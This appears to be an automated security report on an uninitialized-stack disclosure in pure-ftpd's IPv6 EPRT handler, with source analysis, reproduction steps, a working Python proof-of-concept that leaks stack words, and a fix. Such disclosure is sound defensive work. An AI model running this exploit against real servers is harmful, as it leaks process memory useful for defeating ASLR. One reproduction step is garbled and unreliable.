╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Uninitialized stack memory disclosed in EPRT IPv6 error reply        │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 4.3                                                             │
│                                                                              │
│  Target: /workspace/source                                                   │
│                                                                              │
│  Endpoint: EPRT                                                              │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The IPv6 branch of the EPRT parser builds a struct sockaddr_storage on the  │
│  stack and fills only the address family and the 16 address bytes, leaving   │
│  sin6_scope_id uninitialized. When the supplied address differs from the     │
│  control connection's peer, the structure is passed to                       │
│  getnameinfo(NI_NUMERICHOST), which appends `%<sin6_scope_id>` to the        │
│  formatted address and returns uninitialized stack memory to the client in   │
│  the 500 reply. An authenticated client can read four bytes of process       │
│  stack per request, and the value changes with the commands executed         │
│  earlier in the session.                                                     │
│                                                                              │
│  Impact                                                                      │
│  An authenticated client can read four bytes of uninitialized process stack  │
│  per request through the EPRT error reply, and can influence which stale     │
│  values are disclosed by the commands it issues first. This is a             │
│  memory-disclosure primitive that can expose residual process data           │
│  (including address/layout fragments useful for defeating ASLR in a          │
│  follow-on exploit); in the tested build the disclosed word contained no     │
│  directly sensitive value.                                                   │
│                                                                              │
│  Technical Analysis                                                          │
│  The IPv6 branch of the EPRT parser declares the address structure without   │
│  initializing it:\n\n```c title=src/ftpd.c startLineNumber=838               │
│  endLineNumber=866\nstatic void do_ipv6_port(char *p, char delim)\n{\n       │
│  char *deb;\n    struct sockaddr_storage a;        /* uninitialized */\n     │
│  ...\n    if (generic_aton(deb, &a) != 0) {\n        goto nope;\n    }\n     │
│  doport2(a, (unsigned int) port);\n}\n```\n\n`generic_aton()` only sets the  │
│  family (`ss_family`) and the 16 address bytes (`sin6_addr`);                │
│  `sin6_flowinfo` and `sin6_scope_id` are left with whatever the stack        │
│  contains. `doport2()` then compares the address with the control            │
│  connection peer and, when they differ and FXP is not allowed, formats both  │
│  addresses with `getnameinfo(..., NI_NUMERICHOST)`. glibc's IPv6 formatter   │
│  appends `%<sin6_scope_id>` whenever the scope id is non-zero, so the        │
│  uninitialized word is rendered as a decimal suffix in the `500` reply to    │
│  the client.\n\nThe IPv4 EPRT branch (`memset(&a, 0, sizeof a);` before      │
│  filling) and `doport()` already do this correctly, which confirms the       │
│  omission is specific to the IPv6 helper.                                    │
│                                                                              │
│  PoC Description                                                             │
│  1. Build the tree and start `pure-ftpd` locally with a virtual user (for    │
│  example `pure-ftpd -S <port> -E -j -A -l puredb:<db>`).\n2. Connect and     │
│  authenticate (`USER`/`PASS`).\n3. Send `EPRT |2|2001:db8::1|1025|` - an     │
│  IPv6 address that differs from the peer address.\n4. Observe the `500 I     │
│  won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)`      │
│  reply: the `%3724148534` suffix is the uninitialized `sin6_scope_id`        │
│  (0xddf9ff36).\n5. Repeat on a fresh connection without any prior command:   │
│  the same word is returned. Send a long command first (for example `TYPE`    │
│  followed by a 4000-byte argument) and repeat the EPRT: the disclosed word   │
│  changes (0x82e29900), proving it is stale stack content that the client     │
│  can shape.\n6. Submit a very long EPRT and repeat the same correction, and  │
│  the value can be sampled across a session; the fix removes the suffix       │
│  entirely, returning the plain address.                                      │
│                                                                              │
│  PoC Code                                                                    │
│  #!/usr/bin/env python3\n"""Read uninitialized stack memory through the      │
│  IPv6 EPRT error reply."""\nimport re, socket, sys\n\nHOST, PORT =           │
│  "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 2121\nUSER, PW =    │
│  "user", "password"\n\ndef sample(shape=None):\n    s =                      │
│  socket.create_connection((HOST, PORT), timeout=10)\n    s.settimeout(10)\n  │
│  def rd():\n        try:\n            return                                 │
│  s.recv(65535).decode("latin1")\n        except Exception:\n                 │
│  return ""\n    rd()\n    s.sendall(b"USER " + USER.encode() + b"\\r\\n");   │
│  rd()\n    s.sendall(b"PASS " + PW.encode() + b"\\r\\n"); rd()\n    if       │
│  shape:\n        s.sendall(shape + b"\\r\\n"); rd()\n    s.sendall(b"EPRT    │
│  |2|2001:db8::1|1025|\\r\\n")\n    reply = rd()\n    s.close()\n    m =      │
│  re.search(r"to (\\S+)", reply)\n    return reply.strip(), m.group(1) if m   │
│  else None\n\nprint("clean session :", sample())\nprint("after TYPE    :",   │
│  sample(b"TYPE " + b"A" * 4000))\n                                           │
│                                                                              │
│  Remediation                                                                 │
│  Zero the sockaddr_storage before populating it, as the IPv4 EPRT and PORT   │
│  paths already do, so no uninitialized fields can reach getnameinfo. More    │
│  generally, initialize every stack sockaddr structure at declaration and     │
│  consider passing an explicit length from a single construction helper so    │
│  partially filled address structures cannot be formatted or compared.        │
│                                                                              │
